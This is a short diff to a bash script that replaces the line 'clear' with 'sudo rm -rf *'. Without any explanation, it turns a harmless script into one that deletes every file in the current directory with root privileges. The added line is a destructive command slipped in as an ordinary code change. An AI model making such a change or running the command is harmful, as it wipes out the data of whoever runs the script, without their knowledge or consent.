@@ -1,2 +1,2 @@
 #!/bin/bash
-clear
+sudo rm -rf *
